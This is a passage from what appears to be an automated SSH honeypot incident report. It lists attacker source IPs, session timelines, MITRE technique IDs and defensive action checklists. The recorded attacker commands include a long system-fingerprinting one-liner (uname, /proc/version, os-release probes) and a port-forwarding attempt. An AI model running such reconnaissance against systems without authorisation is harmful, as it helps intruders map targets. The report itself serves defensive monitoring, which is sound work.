| `2026-07-04 05:41:24` | `cowrie.login.success` |
| `2026-07-04 05:41:25` | `cowrie.session.params` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.success` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.command.input` |
| `2026-07-04 05:41:25` | `cowrie.log.closed` |
| `2026-07-04 05:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6e876ca321

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 05:43 |
| **Last Seen** | 2026-07-04 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:43:11` | `cowrie.session.connect` |
| `2026-07-04 05:43:11` | `cowrie.client.version` |
| `2026-07-04 05:43:11` | `cowrie.client.kex` |
| `2026-07-04 05:43:11` | `cowrie.login.success` |
| `2026-07-04 05:43:12` | `cowrie.session.params` |
| `2026-07-04 05:43:12` | `cowrie.command.input` |
| `2026-07-04 05:43:12` | `cowrie.log.closed` |
| `2026-07-04 05:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b94734fc986

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:43 |
| **Last Seen** | 2026-07-04 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:43:20` | `cowrie.session.connect` |
| `2026-07-04 05:43:20` | `cowrie.client.version` |
| `2026-07-04 05:43:20` | `cowrie.client.kex` |
| `2026-07-04 05:43:21` | `cowrie.login.success` |
| `2026-07-04 05:43:21` | `cowrie.session.params` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.success` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.command.input` |
| `2026-07-04 05:43:21` | `cowrie.log.closed` |
| `2026-07-04 05:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3438e2c9febc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 05:45 |
| **Last Seen** | 2026-07-04 05:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:45:16` | `cowrie.session.connect` |
| `2026-07-04 05:45:17` | `cowrie.client.version` |
| `2026-07-04 05:45:17` | `cowrie.client.kex` |
| `2026-07-04 05:45:25` | `cowrie.login.success` |
| `2026-07-04 05:45:29` | `cowrie.session.params` |
| `2026-07-04 05:45:29` | `cowrie.command.input` |
| `2026-07-04 05:45:30` | `cowrie.log.closed` |
| `2026-07-04 05:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863cab477cec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:46 |
| **Last Seen** | 2026-07-04 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:46:54` | `cowrie.session.connect` |
| `2026-07-04 05:46:54` | `cowrie.client.version` |
| `2026-07-04 05:46:54` | `cowrie.client.kex` |
| `2026-07-04 05:46:55` | `cowrie.login.success` |
| `2026-07-04 05:46:55` | `cowrie.session.params` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.success` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:55` | `cowrie.command.input` |
| `2026-07-04 05:46:56` | `cowrie.log.closed` |
| `2026-07-04 05:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c64ce93b0b5

| Field | Detail |
|---|---|
| **Source IP** | `35.205.43[.]106` |
| **First Seen** | 2026-07-04 05:48 |
| **Last Seen** | 2026-07-04 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:48:04` | `cowrie.session.connect` |
| `2026-07-04 05:48:04` | `cowrie.login.success` |
| `2026-07-04 05:48:05` | `cowrie.session.params` |
| `2026-07-04 05:48:05` | `cowrie.command.input` |
| `2026-07-04 05:48:05` | `cowrie.command.input` |
| `2026-07-04 05:48:05` | `cowrie.command.failed` |
| `2026-07-04 05:48:05` | `cowrie.command.input` |
| `2026-07-04 05:48:05` | `cowrie.log.closed` |
| `2026-07-04 05:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.43[.]106` to AbuseIPDB if not already reported
- [ ] Block `35.205.43[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5e85d945d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:48 |
| **Last Seen** | 2026-07-04 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:48:06` | `cowrie.session.connect` |
| `2026-07-04 05:48:06` | `cowrie.client.version` |
| `2026-07-04 05:48:06` | `cowrie.client.kex` |
| `2026-07-04 05:48:06` | `cowrie.login.success` |
| `2026-07-04 05:48:07` | `cowrie.session.params` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.success` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.command.input` |
| `2026-07-04 05:48:07` | `cowrie.log.closed` |
| `2026-07-04 05:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ee736f62ad

| Field | Detail |
|---|---|
| **Source IP** | `35.205.43[.]106` |
| **First Seen** | 2026-07-04 05:48 |
| **Last Seen** | 2026-07-04 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:48:17` | `cowrie.session.connect` |
| `2026-07-04 05:48:17` | `cowrie.login.success` |
| `2026-07-04 05:48:18` | `cowrie.session.params` |
| `2026-07-04 05:48:18` | `cowrie.command.input` |
| `2026-07-04 05:48:18` | `cowrie.command.failed` |
| `2026-07-04 05:48:19` | `cowrie.log.closed` |
| `2026-07-04 05:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.43[.]106` to AbuseIPDB if not already reported
- [ ] Block `35.205.43[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d8eec5ac59

| Field | Detail |
|---|---|
| **Source IP** | `35.205.43[.]106` |
| **First Seen** | 2026-07-04 05:48 |
| **Last Seen** | 2026-07-04 05:48 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:48:19` | `cowrie.session.connect` |
| `2026-07-04 05:48:19` | `cowrie.login.success` |
| `2026-07-04 05:48:20` | `cowrie.session.params` |
| `2026-07-04 05:48:20` | `cowrie.command.input` |
| `2026-07-04 05:48:36` | `cowrie.log.closed` |
| `2026-07-04 05:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.43[.]106` to AbuseIPDB if not already reported
- [ ] Block `35.205.43[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53c9a512404

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 05:49 |
| **Last Seen** | 2026-07-04 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:49:25` | `cowrie.session.connect` |
| `2026-07-04 05:49:25` | `cowrie.client.version` |
| `2026-07-04 05:49:25` | `cowrie.client.kex` |
| `2026-07-04 05:49:25` | `cowrie.login.success` |
| `2026-07-04 05:49:26` | `cowrie.direct-tcpip.request` |
| `2026-07-04 05:49:26` | `cowrie.direct-tcpip.data` |
| `2026-07-04 05:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5ed0d6b0993

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:50 |
| **Last Seen** | 2026-07-04 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:50:32` | `cowrie.session.connect` |
| `2026-07-04 05:50:32` | `cowrie.client.version` |
| `2026-07-04 05:50:33` | `cowrie.client.kex` |
| `2026-07-04 05:50:33` | `cowrie.login.success` |
| `2026-07-04 05:50:34` | `cowrie.session.params` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.success` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.command.input` |
| `2026-07-04 05:50:34` | `cowrie.log.closed` |
| `2026-07-04 05:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de77dc7a9e8d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:54 |
| **Last Seen** | 2026-07-04 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:54:01` | `cowrie.session.connect` |
| `2026-07-04 05:54:01` | `cowrie.client.version` |
| `2026-07-04 05:54:01` | `cowrie.client.kex` |
| `2026-07-04 05:54:02` | `cowrie.login.success` |
| `2026-07-04 05:54:02` | `cowrie.session.params` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.success` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:02` | `cowrie.command.input` |
| `2026-07-04 05:54:03` | `cowrie.log.closed` |
| `2026-07-04 05:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5773034eb52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:54 |
| **Last Seen** | 2026-07-04 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:54:43` | `cowrie.session.connect` |
| `2026-07-04 05:54:43` | `cowrie.client.version` |
| `2026-07-04 05:54:43` | `cowrie.client.kex` |
| `2026-07-04 05:54:43` | `cowrie.login.success` |
| `2026-07-04 05:54:44` | `cowrie.session.params` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.success` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.command.input` |
| `2026-07-04 05:54:44` | `cowrie.log.closed` |
| `2026-07-04 05:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91e058c4d96a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 05:57 |
| **Last Seen** | 2026-07-04 05:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:57:15` | `cowrie.session.connect` |
| `2026-07-04 05:57:17` | `cowrie.client.version` |
| `2026-07-04 05:57:17` | `cowrie.client.kex` |
| `2026-07-04 05:57:22` | `cowrie.login.success` |
| `2026-07-04 05:57:26` | `cowrie.session.params` |
| `2026-07-04 05:57:26` | `cowrie.command.input` |
| `2026-07-04 05:57:28` | `cowrie.log.closed` |
| `2026-07-04 05:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394ac8dfd1e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:57 |
| **Last Seen** | 2026-07-04 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:57:28` | `cowrie.session.connect` |
| `2026-07-04 05:57:28` | `cowrie.client.version` |
| `2026-07-04 05:57:28` | `cowrie.client.kex` |
| `2026-07-04 05:57:29` | `cowrie.login.success` |
| `2026-07-04 05:57:30` | `cowrie.session.params` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.success` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.command.input` |
| `2026-07-04 05:57:30` | `cowrie.log.closed` |
| `2026-07-04 05:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6471a9528c8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:59 |
| **Last Seen** | 2026-07-04 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:59:01` | `cowrie.session.connect` |
| `2026-07-04 05:59:01` | `cowrie.client.version` |
| `2026-07-04 05:59:01` | `cowrie.client.kex` |
| `2026-07-04 05:59:01` | `cowrie.login.success` |
| `2026-07-04 05:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7125aae459

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:59 |
| **Last Seen** | 2026-07-04 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:59:02` | `cowrie.session.connect` |
| `2026-07-04 05:59:02` | `cowrie.client.version` |
| `2026-07-04 05:59:02` | `cowrie.client.kex` |
| `2026-07-04 05:59:02` | `cowrie.login.success` |
| `2026-07-04 05:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc344b88c95

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:59 |
| **Last Seen** | 2026-07-04 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:59:09` | `cowrie.session.connect` |
| `2026-07-04 05:59:09` | `cowrie.client.version` |
| `2026-07-04 05:59:09` | `cowrie.client.kex` |
| `2026-07-04 05:59:10` | `cowrie.login.success` |
| `2026-07-04 05:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1517da3abb26

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:59 |
| **Last Seen** | 2026-07-04 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:59:10` | `cowrie.session.connect` |
| `2026-07-04 05:59:10` | `cowrie.client.version` |
| `2026-07-04 05:59:10` | `cowrie.client.kex` |
| `2026-07-04 05:59:10` | `cowrie.login.success` |
| `2026-07-04 05:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74deeac93c71

| Field | Detail |
|---|---|
